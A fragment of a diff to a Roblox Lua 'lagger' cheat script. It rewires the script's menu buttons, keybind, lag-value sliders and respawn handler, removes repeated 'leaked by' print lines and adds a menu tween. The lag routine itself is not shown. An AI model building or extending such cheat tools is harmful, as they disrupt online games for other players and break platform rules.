-        ToggleBtn.TextColor3 = CONFIG.Colors.TextSecondary
-        ToggleBtn.BackgroundColor3 = CONFIG.Colors.ButtonDisabled
+    if input.KeyCode == keybind then
+        toggle()
     end
-end
+end)
 
-local function setupConnections()
-    CloseBtn.MouseButton1Click:Connect(function()
-        MainFrame.Visible = false
-        ReopenBtn.Visible = true
-    end)
+lp.CharacterAdded:Connect(function()
+    task.wait(1)
+    if activated and not closed then
+        if lagConn then lagConn:Disconnect() end
+        lagConn = nil
+        startLag()
+    end
+end)
 
-    ReopenBtn.MouseButton1Click:Connect(function()
-        MainFrame.Visible = true
-        ReopenBtn.Visible = false
-    end)
-
-    ToggleBtn.MouseButton1Click:Connect(function()
-        toggleLagger()
-        saveConfig()
-    end)
-
-    BindBtn.MouseButton1Click:Connect(function()
-        BindBtn.Text = "..."
-        isBinding = true
-    end)
-
-    UserInputService.InputBegan:Connect(function(input, gameProcessed)
-        if isBinding and input.UserInputType == Enum.UserInputType.Keyboard then
-            currentBind = input.KeyCode
-            BindBtn.Text = currentBind.Name
-            isBinding = false
-            saveConfig()
-        elseif not gameProcessed and input.KeyCode == currentBind then
-            MainFrame.Visible = not MainFrame.Visible
-            ReopenBtn.Visible = not MainFrame.Visible
-        end
-    end)
-
-    Opt1Minus.MouseButton1Click:Connect(function()
-        opt1Value = math.max(1, opt1Value - 1)
-        Opt1Val.Text = tostring(opt1Value)
-        cfg.lag1 = opt1Value
-        if laggerEnabled then
-            stopLagger()
-            task.wait(0.1)
-            startLagger()
-        end
-        saveConfig()
-    end)
-    Opt1Plus.MouseButton1Click:Connect(function()
-        opt1Value = math.min(5000, opt1Value + 1)
-        Opt1Val.Text = tostring(opt1Value)
-        cfg.lag1 = opt1Value
-        if laggerEnabled then
-            stopLagger()
-            task.wait(0.1)
-            startLagger()
-        end
-        saveConfig()
-    end)
-
-    Opt2Minus.MouseButton1Click:Connect(function()
-        opt2Value = math.max(1, opt2Value - 10)
-        Opt2Val.Text = tostring(opt2Value)
-        cfg.lag2 = opt2Value
-        saveConfig()
-    end)
-    Opt2Plus.MouseButton1Click:Connect(function()
-        opt2Value = math.min(5000, opt2Value + 10)
-        Opt2Val.Text = tostring(opt2Value)
-        cfg.lag2 = opt2Value
-        saveConfig()
-    end)
-
-    LocalPlayer.CharacterAdded:Connect(function()
-        task.wait(1.2)
-        if laggerEnabled then
-            stopLagger()
-            task.wait(0.3)
-            startLagger()
-        end
-    end)
-end
-
-local function init()
-    createGUI()
-    setupConnections()
-    loadConfig()
-    updateToggleUI()
-end
-
-init()
-
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
-print("leaked by slivin and eugene🥷")
+TweenService:Create(main, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+    Size = expandedSize
+}):Play()
